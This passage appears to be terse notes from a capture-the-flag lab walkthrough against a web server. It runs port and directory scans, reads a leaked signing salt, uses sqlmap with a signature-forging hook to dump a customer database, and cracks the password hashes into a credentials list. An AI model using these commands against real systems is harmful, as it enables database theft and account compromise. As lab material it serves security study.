@@ -1,0 +1,75 @@
+$ nmap --min-rate 1000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.231
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+$ sudo nmap -oN nmap-udp -sU -Pn -v 10.10.10.231
+
+
+
+http://10.10.10.231/licenses/
+
+
+
+    <script type="text/javascript">
+        jQuery('#headerwrap').backstretch([ "assets/img/bg/bg1.jpg", "assets/img/bg/bg3.jpg" ], {duration: 8000, fade: 500});
+        $( "#product-content" ).load("/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b",function() {});
+    </script>
+
+$ gobuster dir -o 80_gobuster.txt -u http://10.10.10.231/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php 
+
+$ gobuster dir -o 80_gobuster_php.txt -u http://10.10.10.231/licenses -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php 
+
+
+$ curl http://10.10.10.231/products-ajax.php
+
+<!-- [8] Undefined index: order
+On line 6 in file C:\inetpub\wwwroot\products-ajax.php
+  1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php 
+  2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim'); 
+  3 |   include('functions.php'); 
+  4 |   include('db-config.php'); 
+  5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                <<<<< Error encountered in this line.
+  6 |     // Set the response code to 500 
+  7 |     http_response_code(500); 
+  8 |     // and die(). Someone fiddled with the parameters. 
+  9 |     die('Parameter missing or malformed.'); 
+ 10 |   } 
+ 11 |  
+// -->
+Parameter missing or malformed.                 
+
+$ curl -I http://10.10.10.231/products-ajax.php
+
+HTTP/1.1 500 Internal Server Error
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.4.1
+Date: Wed, 07 Apr 2021 18:05:04 GMT
+
+$ sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b" --eval="import hashlib;h=hashlib.md5(('hie0shah6ooNoim'+order).encode()).hexdigest()"
+
+Parameter: order (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: order=(SELECT (CASE WHEN (8581=8581) THEN 'id desc' ELSE (SELECT 2416 UNION SELECT 5558) END))&h=a1b30d31d344a5a4e41e8496ccbdd26b
+
+    Type: time-based blind
+    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
+    Payload: order=id desc PROCEDURE ANALYSE(EXTRACTVALUE(9193,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x66637461))))),1)&h=a1b30d31d344a5a4e41e8496ccbdd26b
+
+$ sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b" --eval="import hashlib;h=hashlib.md5(('hie0shah6ooNoim'+order).encode()).hexdigest()" --dump
+
+$ cat customers | awk -F "|" '{print $3}' | grep -E "@" | tr -d ' ' > users.txt
+
+$ cat customers | awk -F "|" '{print $4}' | grep -E "[0-9a-f]{32}" | tr -d ' ' > hashes
+
+$ hashcat --force -m 0 hashes /usr/share/wordlists/rockyou.txt 
+
+$ hashcat --force --show -m 0 hashes /usr/share/wordlists/rockyou.txt > hashes_cracked
+
+$ cat hashes_cracked | cut -d ":" -f 2 > passwords.txt
+
+$ ctr=0;for i in $(cat passwords.txt); do x=$((ctr=ctr+1)); sed -E "$(echo $x)s/(.*)/\1:$i/g" users.txt | grep ":" >> creds.txt; done;
+
